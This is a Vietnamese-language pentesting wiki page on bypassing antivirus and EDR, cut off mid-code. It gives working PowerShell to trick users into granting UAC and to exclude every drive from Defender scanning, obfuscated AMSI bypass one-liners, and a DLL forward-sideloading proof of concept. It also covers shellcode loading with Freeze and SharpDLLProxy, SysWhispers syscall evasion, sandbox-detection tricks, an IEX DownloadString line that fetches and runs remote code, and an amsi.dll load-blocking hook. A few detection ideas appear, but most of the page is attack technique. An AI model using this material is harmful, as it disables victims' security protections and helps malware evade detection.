# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Trang này ban đầu được viết bởi** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Dừng Defender

- [defendnot](https://github.com/es3n1n/defendnot): Công cụ ngăn Windows Defender hoạt động.
- [no-defender](https://github.com/es3n1n/no-defender): Công cụ giả mạo một AV khác để ngăn Windows Defender hoạt động.
- [Vô hiệu hóa Defender nếu bạn là admin](basic-powershell-for-pentesters/README.md)

### Dụ người dùng chấp thuận UAC theo kiểu trình cài đặt trước khi can thiệp vào Defender

Các loader công khai giả dạng cheat game thường được phát hành dưới dạng trình cài đặt Node.js/Nexe chưa ký, trước tiên **yêu cầu người dùng cấp quyền nâng cao**, rồi mới vô hiệu hóa Defender. Quy trình rất đơn giản:

1. Kiểm tra ngữ cảnh quản trị bằng `net session`. Lệnh này chỉ thành công khi người gọi có quyền admin, vì vậy nếu thất bại thì loader đang chạy với tư cách người dùng thông thường.
2. Ngay lập tức khởi chạy lại chính nó bằng verb `RunAs` để kích hoạt lời nhắc chấp thuận UAC như dự kiến, đồng thời giữ nguyên dòng lệnh ban đầu.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Nạn nhân vốn đã tin rằng họ đang cài phần mềm “cracked”, nên thường chấp nhận lời nhắc, cấp cho malware các quyền cần thiết để thay đổi chính sách của Defender.<sup>[[26]](#references)</sup>

### Các ngoại lệ `MpPreference` bao trùm mọi ký tự ổ đĩa

Sau khi có quyền nâng cao, các chuỗi tấn công kiểu GachiLoader tối đa hóa những điểm mù của Defender thay vì tắt hẳn dịch vụ. Trước tiên, loader dừng tiến trình giám sát GUI (`taskkill /F /IM SecHealthUI.exe`), rồi thêm **các ngoại lệ cực kỳ rộng** để mọi hồ sơ người dùng, thư mục hệ thống và ổ đĩa di động đều không thể bị quét:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Các quan sát chính:

- Vòng lặp duyệt qua mọi hệ thống tệp được gắn kết (D:\, E:\, USB, v.v.), vì vậy **mọi payload được thả ở bất kỳ đâu trên ổ đĩa sau này đều bị bỏ qua**.
- Loại trừ phần mở rộng `.sys` là biện pháp hướng tới tương lai—kẻ tấn công giữ lại tùy chọn tải driver chưa ký sau này mà không cần chỉnh sửa Defender lần nữa.
- Mọi thay đổi đều nằm trong `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, cho phép các giai đoạn sau xác nhận rằng các mục loại trừ vẫn còn hoặc mở rộng chúng mà không kích hoạt lại UAC.

Vì không có dịch vụ Defender nào bị dừng, các kiểm tra tình trạng đơn giản vẫn báo “antivirus active”, dù tính năng kiểm tra theo thời gian thực không hề quét các đường dẫn đó.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Hiện nay, AV sử dụng nhiều phương pháp khác nhau để kiểm tra một tệp có độc hại hay không, gồm phát hiện tĩnh, phân tích động và, với các EDR tiên tiến hơn, phân tích hành vi.

### **Phát hiện tĩnh**

Phát hiện tĩnh được thực hiện bằng cách đánh dấu các chuỗi hoặc mảng byte độc hại đã biết trong binary hoặc script, đồng thời trích xuất thông tin từ chính tệp đó (ví dụ: mô tả tệp, tên công ty, chữ ký số, biểu tượng, checksum, v.v.). Điều này có nghĩa là bạn có thể dễ bị phát hiện hơn khi sử dụng các công cụ công khai đã biết, vì chúng có thể đã được phân tích và đánh dấu là độc hại. Có một số cách để vượt qua kiểu phát hiện này:

- **Mã hóa**

Nếu mã hóa binary, AV sẽ không thể phát hiện chương trình của bạn, nhưng bạn sẽ cần một loader nào đó để giải mã và chạy chương trình trong bộ nhớ.

- **Obfuscation**

Đôi khi, bạn chỉ cần thay đổi một số chuỗi trong binary hoặc script để vượt qua AV, nhưng việc này có thể tốn thời gian, tùy vào nội dung bạn muốn obfuscate.

- **Công cụ tự phát triển**

Nếu tự phát triển công cụ, sẽ không có signature độc hại đã biết nào, nhưng việc này tốn nhiều thời gian và công sức.

> [!TIP]
> Một cách hay để kiểm tra khả năng phát hiện tĩnh của Windows Defender là dùng [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Công cụ này chia tệp thành nhiều đoạn rồi yêu cầu Defender quét riêng từng đoạn; nhờ đó, nó có thể cho bạn biết chính xác những chuỗi hoặc byte nào trong binary bị đánh dấu.

Tôi rất khuyến khích bạn xem [danh sách phát YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) này về AV Evasion thực tế.

### Kiểm tra ngoại tuyến các đặc trưng PE dành cho bộ phân loại tĩnh

Các byte payload được pack hoặc mã hóa chỉ là một trong những đầu vào của bộ phân loại tĩnh. EMBER2024 trích xuất các đặc trưng PE, bao gồm imports, exports, sections, headers và dữ liệu Authenticode.<sup>[[48]](#references)</sup> Trong một thử nghiệm với loader, việc thêm 141 imports trông có vẻ lành tính đã làm giảm 93% điểm độc hại của EMBER2024, trong khi các imports thường gắn với malware làm điểm này tăng lên. Đây là kết quả của mô hình và các mẫu đó, không phải cách đáng tin cậy để vượt qua một sản phẩm AV/EDR cụ thể.<sup>[[50]](#references)</sup>

Đối với thử nghiệm loader được ủy quyền, hãy giữ payload và đường dẫn thực thi không đổi, chỉ thay đổi một biến build dự kiến cho mỗi biến thể, rồi so sánh điểm số ngoại tuyến. Kiểm tra các đặc trưng PE thu được vì một thay đổi trong quá trình build có thể ảnh hưởng đến nhiều nhóm đặc trưng.<sup>[[49]](#references)[[50]](#references)</sup> Để giữ các imports dự kiến trong IAT, hãy gọi các Win32 API đã chọn từ mã có thể truy cập được. Thay đổi lựa chọn và phân bổ các vị trí gọi qua nhiều bản build thay vì tạo một hàm ngụy trang cố định có thể trở thành signature. Thử nghiệm cũng ghi nhận điểm số thấp hơn khi có chữ ký mã hợp lệ, các mục export và nhiều hàm hơn làm tăng kích thước `.pdata`; chữ ký không hợp lệ ít ảnh hưởng, còn tác động của `.pdata` là nhỏ.<sup>[[50]](#references)</sup>

Gói `thrember` cung cấp tính năng trích xuất đặc trưng và các mô hình benchmark. Sau khi cài đặt, hãy dùng `thrember.download_models("models")` với thư mục `models` đã tồn tại, sau đó chạy bộ chấm điểm từ thư mục cha: hàm tải xuống làm thay đổi thư mục làm việc hiện tại. Bộ phân loại PE có thể chấm điểm một thư mục chứa các bản build mà không cần gửi chúng đến dịch vụ quét:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep cố định phiên bản model và feature-extractor trong suốt quá trình so sánh. Điểm offline thấp hơn chỉ cho thấy classifier này phản ứng thế nào với binary đã thay đổi; điều đó không chứng minh việc né tránh behavioral analysis, emulation hay model khác của nhà cung cấp.<sup>[[49]](#references)[[50]](#references)</sup> Để tìm hiểu về [per-build polymorphism và ngụy trang outer-binary trong payload được virtualize](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), hãy xem execution model riêng.

### **Dynamic analysis**

Dynamic analysis là khi AV chạy binary của bạn trong sandbox và theo dõi các hoạt động độc hại (ví dụ: cố giải mã và đọc mật khẩu trong trình duyệt, thực hiện minidump LSASS, v.v.). Phần này có thể hơi khó xử lý hơn, nhưng sau đây là một số cách bạn có thể dùng để né sandbox.

- **Chờ trước khi thực thi** Tùy cách triển khai, đây có thể là cách rất hiệu quả để vượt qua dynamic analysis của AV. AV có rất ít thời gian để quét file nhằm không làm gián đoạn quy trình làm việc của người dùng, vì vậy thời gian chờ dài có thể cản trở việc phân tích binary. Vấn đề là nhiều sandbox của AV có thể bỏ qua thời gian chờ, tùy cách triển khai.
- **Kiểm tra tài nguyên của máy** Sandbox thường có rất ít tài nguyên để sử dụng (ví dụ: dưới 2 GB RAM), nếu không chúng có thể làm chậm máy của người dùng. Bạn cũng có thể sáng tạo hơn, chẳng hạn kiểm tra nhiệt độ CPU hoặc thậm chí tốc độ quạt; không phải thứ gì cũng được triển khai trong sandbox.
- **Kiểm tra thông tin riêng của máy** Nếu bạn muốn nhắm tới người dùng có workstation tham gia domain "contoso.local", bạn có thể kiểm tra domain của máy tính để xem nó có khớp với domain đã chỉ định hay không; nếu không khớp, chương trình có thể thoát.

Hóa ra computername của máy Sandbox Microsoft Defender là HAL9TH. Vì vậy, bạn có thể kiểm tra tên máy tính trong malware trước khi detonatе; nếu tên khớp với HAL9TH, tức là bạn đang ở trong sandbox của Defender và có thể cho chương trình thoát.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>nguồn: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Một số mẹo rất hữu ích khác từ [@mgeeky](https://twitter.com/mariuszbit) để đối phó với Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kênh #malware-dev</p></figcaption></figure>

Như đã nói trước đó trong bài viết này, **các công cụ công khai** rồi sẽ **bị phát hiện**, vì vậy bạn nên tự hỏi điều này:

Ví dụ, nếu muốn dump LSASS, **bạn có thực sự cần dùng mimikatz không**? Hay bạn có thể dùng một project ít được biết đến hơn nhưng cũng dump được LSASS?

Câu trả lời đúng có lẽ là phương án sau. Lấy mimikatz làm ví dụ: đây có lẽ là một trong những, nếu không muốn nói là phần mềm độc hại bị AV và EDR đánh dấu nhiều nhất. Bản thân project rất tuyệt, nhưng cũng cực kỳ khó sử dụng để vượt qua AV; vì vậy, hãy tìm các giải pháp thay thế cho mục tiêu của bạn.

> [!TIP]
> Khi chỉnh sửa payload để né phát hiện, hãy nhớ **tắt tính năng tự động gửi mẫu** trong Defender; và xin hãy nghiêm túc **ĐỪNG TẢI LÊN VIRUSTOTAL** nếu mục tiêu của bạn là né phát hiện về lâu dài. Nếu muốn kiểm tra xem một AV cụ thể có phát hiện payload hay không, hãy cài AV đó trên VM, thử tắt tính năng tự động gửi mẫu rồi kiểm tra tại đó cho đến khi bạn hài lòng với kết quả.

## EXEs vs DLLs

Bất cứ khi nào có thể, hãy luôn **ưu tiên dùng DLL để né phát hiện**. Theo kinh nghiệm của tôi, file DLL thường **ít bị phát hiện và phân tích hơn nhiều**, vì vậy đây là một mẹo rất đơn giản để tránh bị phát hiện trong một số trường hợp (tất nhiên là nếu payload của bạn có cách chạy dưới dạng DLL).

Như hình bên dưới, DLL Payload từ Havoc có tỷ lệ bị phát hiện là 4/26 trên antiscan.me, trong khi EXE payload có tỷ lệ bị phát hiện là 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>so sánh trên antiscan.me giữa Havoc EXE payload thông thường và Havoc DLL thông thường</p></figcaption></figure>

Sau đây là một số thủ thuật bạn có thể dùng với file DLL để tăng khả năng ẩn mình.

## DLL Sideloading & Proxying

**DLL Sideloading** tận dụng thứ tự tìm kiếm DLL mà loader sử dụng bằng cách đặt ứng dụng nạn nhân và payload độc hại cạnh nhau.

Bạn có thể dùng [Siofra](https://github.com/Cybereason/siofra) và script powershell sau để tìm các chương trình dễ bị DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Lệnh này sẽ xuất danh sách các chương trình trong "C:\Program Files\\" dễ bị DLL hijacking và các tệp DLL mà chúng cố tải.

Tôi đặc biệt khuyên bạn **tự tìm hiểu các chương trình có thể bị DLL Hijack/Sideload**, kỹ thuật này khá kín đáo nếu được thực hiện đúng cách, nhưng nếu bạn sử dụng các chương trình DLL Sideload có thông tin công khai, bạn có thể dễ dàng bị phát hiện.

Chỉ đặt một DLL độc hại có tên mà chương trình dự kiến tải sẽ không khiến payload của bạn được tải, vì chương trình yêu cầu một số hàm cụ thể bên trong DLL đó. Để khắc phục vấn đề này, chúng ta sẽ dùng một kỹ thuật khác gọi là **DLL Proxying/Forwarding**.

**DLL Proxying** chuyển tiếp các lệnh gọi mà chương trình thực hiện từ DLL proxy (và độc hại) sang DLL gốc, nhờ đó bảo toàn chức năng của chương trình và cho phép thực thi payload.

Tôi sẽ sử dụng dự án [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) của [@flangvik](https://twitter.com/Flangvik/).

Đây là các bước tôi đã thực hiện:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Lệnh cuối cùng sẽ tạo ra 2 tệp: một mẫu mã nguồn DLL và DLL gốc đã được đổi tên.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Đây là kết quả:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Cả shellcode của chúng ta (được mã hóa bằng [SGN](https://github.com/EgeBalci/sgn)) lẫn proxy DLL đều có Detection rate 0/26 trên [antiscan.me](https://antiscan.me)! Tôi cho rằng đây là một thành công.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Tôi **rất khuyến nghị** bạn xem [VOD trên Twitch của S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) về DLL Sideloading, cũng như [video của ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) để tìm hiểu sâu hơn về những gì chúng ta đã thảo luận.

### Lạm dụng Forwarded Exports (ForwardSideLoading)

Các module PE của Windows có thể export những hàm thực chất là “forwarder”: thay vì trỏ đến mã, mục export chứa một chuỗi ASCII theo định dạng `TargetDll.TargetFunc`. Khi một caller phân giải export, Windows loader sẽ:

- Load `TargetDll` nếu chưa được load
- Phân giải `TargetFunc` từ module đó

Các hành vi quan trọng cần hiểu:
- Nếu `TargetDll` là KnownDLL, nó được cung cấp từ namespace KnownDLLs được bảo vệ (ví dụ: ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Nếu `TargetDll` không phải KnownDLL, thứ tự tìm kiếm DLL thông thường sẽ được sử dụng, bao gồm cả thư mục của module đang thực hiện việc phân giải forward.

Điều này tạo ra một primitive sideloading gián tiếp: tìm một DLL đã ký có export một hàm được forward đến tên module không thuộc KnownDLL, rồi đặt DLL đã ký đó cùng thư mục với một DLL do kẻ tấn công kiểm soát, có tên trùng khớp chính xác với module đích được forward. Khi hàm export được forward được gọi, loader sẽ phân giải forward và load DLL của bạn từ cùng thư mục, thực thi DllMain.<sup>[[13]](#references)</sup>

Ví dụ được quan sát trên Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` không phải là KnownDLL, vì vậy nó được phân giải theo thứ tự tìm kiếm thông thường.

PoC (sao chép-dán):
1) Sao chép DLL hệ thống đã ký vào một thư mục có quyền ghi
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Đặt một `NCRYPTPROV.dll` độc hại vào cùng thư mục. Chỉ cần một DllMain tối giản để thực thi mã; bạn không cần triển khai hàm được chuyển tiếp để kích hoạt DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Kích hoạt chuyển tiếp bằng LOLBin được ký:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (đã ký) tải `keyiso.dll` side-by-side (đã ký)
- Khi phân giải `KeyIsoSetAuditingInterface`, loader đi theo forward đến `NCRYPTPROV.SetAuditingInterface`
- Sau đó, loader tải `NCRYPTPROV.dll` từ `C:\test` và thực thi `DllMain` của nó
- Nếu `SetAuditingInterface` chưa được triển khai, bạn sẽ gặp lỗi "missing API" chỉ sau khi `DllMain` đã chạy

Mẹo săn tìm:
- Tập trung vào các export được forward mà module đích không phải là KnownDLL. KnownDLL được liệt kê trong `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Bạn có thể liệt kê các export được forward bằng các công cụ như:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Xem danh sách forwarder của Windows 11 để tìm ứng viên: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ý tưởng phát hiện/phòng thủ:
- Giám sát LOLBins (ví dụ: rundll32.exe) tải DLL đã ký từ các đường dẫn không thuộc hệ thống, sau đó tải các DLL không thuộc KnownDLLs có cùng tên cơ sở từ thư mục đó
- Cảnh báo về các chuỗi tiến trình/module như: `rundll32.exe` → `keyiso.dll` không thuộc hệ thống → `NCRYPTPROV.dll` nằm trong các đường dẫn mà người dùng có thể ghi
- Thực thi các chính sách toàn vẹn mã (WDAC/AppLocker) và cấm quyền ghi+thực thi trong các thư mục ứng dụng

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze là bộ công cụ payload dùng để bypass EDR bằng cách sử dụng tiến trình bị tạm ngưng, direct syscalls và các phương thức thực thi thay thế`

Bạn có thể dùng Freeze để tải và thực thi shellcode một cách kín đáo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion chỉ là trò chơi mèo vờn chuột: thứ hiệu quả hôm nay có thể bị phát hiện vào ngày mai, vì vậy đừng bao giờ chỉ dựa vào một công cụ; nếu có thể, hãy thử kết hợp nhiều kỹ thuật evasion.

## Direct/Indirect Syscalls & Giải quyết SSN (SysWhispers4)

EDR thường đặt **user-mode inline hooks** trên các syscall stub của `ntdll.dll`. Để bypass các hook đó, bạn có thể tạo các syscall stub **direct** hoặc **indirect** để nạp **SSN** (System Service Number) chính xác và chuyển sang kernel mode mà không thực thi entrypoint export đã bị hook.<sup>[[32]](#references)</sup>

**Các tùy chọn gọi:**
- **Direct (embedded)**: phát lệnh `syscall`/`sysenter`/`SVC #0` trong stub được tạo (không gọi export của `ntdll`).
- **Indirect**: nhảy vào một gadget `syscall` có sẵn bên trong `ntdll`, khiến quá trình chuyển sang kernel trông như bắt nguồn từ `ntdll` (hữu ích để né heuristic); **randomized indirect** chọn một gadget từ pool cho mỗi lần gọi.
- **Egg-hunt**: tránh nhúng chuỗi opcode `0F 05` tĩnh vào đĩa; tìm chuỗi syscall tại runtime.

**Các chiến lược giải quyết SSN chống chịu hook:**
- **FreshyCalls (VA sort)**: suy ra SSN bằng cách sắp xếp syscall stub theo địa chỉ ảo thay vì đọc byte của stub.
- **SyscallsFromDisk**: ánh xạ một bản `\KnownDlls\ntdll.dll` sạch, đọc SSN từ `.text` rồi bỏ ánh xạ (bypass tất cả hook trong bộ nhớ).
- **RecycledGate**: kết hợp suy luận SSN theo thứ tự VA với xác thực opcode khi stub còn sạch; chuyển sang suy luận theo VA nếu bị hook.
- **HW Breakpoint**: đặt DR0 tại lệnh `syscall` và dùng VEH để lấy SSN từ `EAX` tại runtime mà không phân tích byte đã bị hook.

Ví dụ cách dùng SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Khi phân tích các syscall export của `ntdll` x64 sạch để tìm SSN, hãy chấp nhận cả `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) và cùng chuỗi đó khi có tiền tố `F3 0F 1E FA` (`endbr64`). Trường hợp thứ hai là một stub có tiền tố CET: parser giả định SSN luôn ở một offset cố định sẽ bỏ sót trường hợp này. Nếu khởi tạo indirect-syscall thất bại và loader chuyển sang `GetProcAddress`, các lời gọi qua những export đó có thể lại gặp user-mode hook.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI được tạo ra để ngăn chặn "[mã độc không tệp](https://en.wikipedia.org/wiki/Fileless_malware)". Ban đầu, AV chỉ có thể quét **các tệp trên đĩa**, vì vậy nếu bạn có thể thực thi payload **trực tiếp trong bộ nhớ**, AV sẽ không thể làm gì để ngăn chặn vì nó không có đủ khả năng quan sát.

Tính năng AMSI được tích hợp vào các thành phần Windows sau:

- User Account Control, hay UAC (nâng quyền khi cài đặt EXE, COM, MSI hoặc ActiveX)
- PowerShell (script, sử dụng tương tác và đánh giá mã động)
- Windows Script Host (wscript.exe và cscript.exe)
- JavaScript và VBScript
- Macro Office VBA

Tính năng này cho phép các giải pháp antivirus kiểm tra hành vi của script bằng cách hiển thị nội dung script ở dạng không mã hóa và không làm rối.

Chạy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sẽ tạo cảnh báo sau trên Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Lưu ý rằng nó thêm tiền tố `amsi:` rồi đến đường dẫn của executable mà script được chạy từ đó, trong trường hợp này là powershell.exe

Chúng ta không ghi tệp nào xuống đĩa nhưng vẫn bị phát hiện trong bộ nhớ do AMSI.

Ngoài ra, kể từ **.NET 4.8**, mã C# cũng được chạy qua AMSI. Điều này thậm chí ảnh hưởng đến việc dùng `Assembly.Load(byte[])` để nạp mã thực thi trong bộ nhớ. Vì vậy, nếu muốn né AMSI khi thực thi trong bộ nhớ, bạn nên dùng các phiên bản .NET cũ hơn (như 4.7.2 trở xuống).

Có một vài cách để vượt qua AMSI:

- **Làm rối mã**

Vì AMSI chủ yếu hoạt động bằng cách phát hiện tĩnh, việc chỉnh sửa các script bạn định nạp có thể là một cách tốt để né phát hiện.

Tuy nhiên, AMSI có khả năng gỡ rối script ngay cả khi có nhiều lớp, nên làm rối mã có thể là lựa chọn không tốt, tùy vào cách thực hiện. Vì vậy, né phát hiện không đơn giản. Dù vậy, đôi khi chỉ cần đổi tên một vài biến là đủ, nên điều này phụ thuộc vào mức độ một nội dung nào đó đã bị gắn cờ.

- **AMSI Bypass**

Vì AMSI được triển khai bằng cách nạp một DLL vào tiến trình powershell (cũng như cscript.exe, wscript.exe, v.v.), nên có thể dễ dàng can thiệp vào nó ngay cả khi chạy với quyền người dùng không đặc quyền. Do lỗ hổng trong cách triển khai AMSI này, các nhà nghiên cứu đã tìm ra nhiều cách để né quét AMSI.

**Buộc xảy ra lỗi**

Buộc quá trình khởi tạo AMSI thất bại (`amsiInitFailed`) sẽ khiến tiến trình hiện tại không khởi chạy quá trình quét nào. Cách này ban đầu được [Matt Graeber](https://twitter.com/mattifestation) công bố và Microsoft đã phát triển một signature để ngăn việc sử dụng rộng rãi hơn.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Chỉ cần một dòng mã PowerShell là đủ để vô hiệu hóa AMSI trong tiến trình PowerShell hiện tại. Tất nhiên, chính AMSI đã phát hiện dòng này, nên cần sửa đổi một chút để sử dụng kỹ thuật này.

Dưới đây là một AMSI bypass đã được chỉnh sửa mà tôi lấy từ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hãy nhớ rằng nội dung này có thể sẽ bị phát hiện sau khi bài viết được đăng, vì vậy bạn không nên công bố code nếu mục tiêu của bạn là duy trì trạng thái không bị phát hiện.

**Memory Patching**

Kỹ thuật này ban đầu được [@RastaMouse](https://twitter.com/_RastaMouse/) phát hiện. Kỹ thuật này tìm địa chỉ của hàm "AmsiScanBuffer" trong amsi.dll (chịu trách nhiệm quét đầu vào do người dùng cung cấp) rồi ghi đè hàm bằng các chỉ thị để trả về mã E_INVALIDARG. Nhờ vậy, kết quả quét thực tế trả về 0, được hiểu là kết quả sạch.

> [!TIP]
> Hãy đọc [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) để tìm hiểu chi tiết hơn.

Ngoài ra còn nhiều kỹ thuật khác dùng để bypass AMSI bằng powershell. Hãy xem [**trang này**](basic-powershell-for-pentesters/index.html#amsi-bypass) và [**repo này**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) để tìm hiểu thêm.

### Chuyển hướng scan-pointer của AMSI COM thay vì patch `AmsiScanBuffer`

Một phương pháp bypass khác chỉ tác động trong phạm vi tiến trình, không đụng đến entry point `AmsiScanBuffer`. Trong .NET loader 64-bit được ghi nhận, một đối tượng AMSI COM được tạo từ CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` trả về con trỏ interface, và slot vtable ở offset `0x18` được dùng làm đích gọi scan. Loader patch một con trỏ native của `Console.Clear()` bằng một stub x64 ngắn, đổi entry vtable đó sang stub bằng `VirtualProtect()`, rồi khôi phục quyền bảo vệ trang ban đầu. Cả độ rộng con trỏ 64-bit lẫn layout COM dự kiến đều là điều kiện tiên quyết; đây không phải offset dùng chung cho mọi interface hoặc phiên bản AMSI. Các giai đoạn được ghi nhận trước đó là [nạp sidecar AppDomainManager đã ký](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) và [giải tuần tự hóa RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Các byte stub được ghi nhận là `41 C7 00 01 00 00 00 33 C0 C3`: chúng ghi **1** vào con trỏ kết quả trong `r8` và trả về **0** trong `eax`. Vì vậy, tuyên bố được nêu rằng kết quả scan là `AMSI_RESULT_CLEAN` (0) đã nhầm lẫn giá trị trả về `S_OK` với enum đầu ra. Theo thứ tự `AMSI_RESULT` được tài liệu hóa, kết quả **1** là `AMSI_RESULT_NOT_DETECTED`; giá trị này vẫn thấp hơn ngưỡng phát hiện.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Chặn AMSI bằng cách ngăn amsi.dll được nạp (hook LdrLoadDll)

AMSI chỉ được khởi tạo sau khi `amsi.dll` được nạp vào tiến trình hiện tại. Một phương pháp bypass mạnh mẽ, không phụ thuộc ngôn ngữ, là đặt một hook user-mode lên `ntdll!LdrLoadDll` để trả về lỗi khi module được yêu cầu là `amsi.dll`. Kết quả là AMSI không bao giờ được nạp và không có lượt quét nào diễn ra trong tiến trình đó.<sup>[[23]](#references)</sup>

Phác thảo cách triển khai (pseudocode C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
